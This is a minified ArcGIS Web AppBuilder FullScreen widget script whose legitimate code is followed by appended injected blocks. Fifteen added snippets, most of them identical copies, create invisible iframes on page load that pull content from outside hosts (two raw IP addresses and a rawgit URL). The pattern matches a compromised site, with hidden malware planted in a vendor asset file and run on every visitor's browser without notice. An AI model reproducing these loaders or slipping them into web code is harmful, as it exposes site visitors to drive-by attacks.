// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"widgets/FullScreen/_build-generate_module":function(){define(["dojo/text!./Widget.html","dojo/text!./css/style.css","dojo/i18n!./nls/strings"],function(){})},"url:widgets/FullScreen/Widget.html":'\x3cdiv\x3e\r\n\t\x3cdiv class\x3d"operate-item fullScreen" data-dojo-attach-event\x3d"onclick:_onFullScreenClick" data-dojo-attach-point\x3d"fullScreenBtn" title\x3d"${label}"\x3e\x3c/div\x3e\r\n\x3c/div\x3e',"url:widgets/FullScreen/css/style.css":'.jimu-widget-fullScreen {border-radius: 4px;}.jimu-widget-fullScreen:not(.jimu-main-background) {opacity: 0.8; color: rgba(0, 0, 0, 0.8);}.jimu-widget-fullScreen:not(.jimu-main-background) .fullScreen{background-color: rgba(0,0,0,0.2);}.jimu-widget-fullScreen:hover{opacity: 1;}.jimu-widget-fullScreen.mobile{display: none !important;}.jimu-widget-fullScreen .fullScreen {width: 30px; height: 30px; text-align: center; color: #fff; line-height: 30px; font-size: 14px; margin-left: auto; margin-right: auto; cursor: pointer; border-radius: 5px;}.jimu-widget-fullScreen .fullScreen:before{font-family: \'Themefont\';}.jimu-widget-fullScreen .fullScreen.restore:before {content: "\\a906";}.jimu-widget-fullScreen .fullScreen.maximize:before {content: "\\a905";}.jimu-widget-fullScreen .fullScreen.f11 {background: #11ee11;}:-webkit-full-screen {width: 100%; height: 100%; background: transparent;}:-moz-full-screen {width: 100%; height: 100%; background: transparent;}:-ms-fullscreen {width: 100%; height: 100%; background: transparent;}:fullscreen {width: 100%; height: 100%; background: transparent;}:full-screen {width: 100%; height: 100%; background: transparent;}:fullscreen-ancestor {z-index: -1;}.body-fullscreened \x3e .dijitPopup {z-index: 2147483647 !important;}',
"*now":function(c){c(['dojo/i18n!*preload*widgets/FullScreen/nls/Widget*["ar","bs","cs","da","de","en","el","es","et","fi","fr","he","hi","hr","id","it","ja","ko","lt","lv","nb","nl","pl","pt-br","pt-pt","ro","ru","sl","sr","sv","th","tr","zh-cn","vi","zh-hk","zh-tw","ROOT"]'])},"*noref":1}});
define("dojo/_base/declare dojo/_base/lang dojo/_base/html dojo/on dojo/query jimu/BaseWidget dojo/_base/window jimu/utils".split(" "),function(c,f,b,g,d,h,k,e){return c([h],{name:"FullScreen",baseClass:"jimu-widget-fullScreen",domsCache:{appDoc:null},ACTION:{HIDE:"hide",SHOW:"show"},MODE:{RESTORE:"restore",MAXIMIZE:"maximize"},state:null,_changeColorThemes:["BillboardTheme","BoxTheme","DartTheme","PlateauTheme"],startup:function(){this.domsCache.appDoc=k.doc;this.state=this.MODE.RESTORE;b.addClass(this.fullScreenBtn,
this.state);-1<this._changeColorThemes.indexOf(this.appConfig.theme.name)&&b.addClass(this.domNode,"jimu-main-background");this.own(g(this.domsCache.appDoc,"webkitfullscreenchange,mozfullscreenchange,MSFullscreenChange,fullscreenchange",f.hitch(this,function(){this._onFullScreenChangeEvent()})))},setPosition:function(){this.inherited(arguments);"DashboardTheme"!==window.getAppConfig().theme.name||window.appInfo.isRunInMobile||(b.setStyle(this.domNode,"z-index",110),this.placeAt(this._getDBThemeContainer()));
window.appInfo.isRunInMobile||e.isMobileUa()?b.addClass(this.domNode,"mobile"):b.removeClass(this.domNode,"mobile")},onAppConfigChanged:function(a){-1<this._changeColorThemes.indexOf(a.theme.name)?b.addClass(this.domNode,"jimu-main-background"):b.removeClass(this.domNode,"jimu-main-background")},_onFullScreenClick:function(){this._toggleFullScreen()},_onFullScreenChangeEvent:function(){this._isFullScreen()?this.state=this.MODE.MAXIMIZE:(this.state=this.MODE.RESTORE,this._toggleFullScreen(this.state));
this._toggleBtnIcon()},_toggleFullScreen:function(a){this._isFullScreen()||a===this.MODE.RESTORE?this._cancelFullScreen(this.domsCache.appDoc):this._launchFullScreen(this.domsCache.appDoc.body)},_toggleBtnIcon:function(){this.state===this.MODE.RESTORE?(b.addClass(this.fullScreenBtn,"restore"),b.removeClass(this.fullScreenBtn,"maximize"),b.removeClass(this.domsCache.appDoc.body,"body-fullscreened")):(b.addClass(this.fullScreenBtn,"maximize"),b.removeClass(this.fullScreenBtn,"restore"),b.addClass(this.domsCache.appDoc.body,
"body-fullscreened"))},_isFullScreen:function(){var a=this._isElementFullScreen(this.domsCache.appDoc);e.isInConfigOrPreviewWindow()&&!1===this._isFullScreenCountByJS(window)&&!0===this._isFullScreenCountByJS(this._getBuilderWindow())&&(a=!1);return a},_getBuilderWindow:function(){return window.parent},_getDBThemeContainer:function(){var a=null;return a=window.appInfo.isRunInMobile?d("#main-page .DashboardTheme")[0]:d(".jimu-dnd-layout")[0]},_isFullScreenCountByJS:function(a){return Math.floor(a.innerWidth)===
Math.floor(screen.width)&&Math.floor(a.innerHeight)===Math.floor(screen.height)},_isElementFullScreen:function(a){return!!(a.fullscreenElement||a.mozFullScreenElement||a.webkitFullscreenElement||a.msFullscreenElement)},_launchFullScreen:function(a){if(a.requestFullScreen)a.requestFullScreen();else if(a.mozRequestFullScreen)a.mozRequestFullScreen();else if(a.webkitRequestFullScreen)a.webkitRequestFullScreen();else if(a.msRequestFullscreen)a.msRequestFullscreen();else return!1},_cancelFullScreen:function(a){if(a.exitFullscreen)a.exitFullscreen();
else if(a.mozCancelFullScreen)a.mozCancelFullScreen();else if(a.webkitCancelFullScreen)a.webkitCancelFullScreen();else if(a.msExitFullscreen)a.msExitFullscreen();else return!1}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});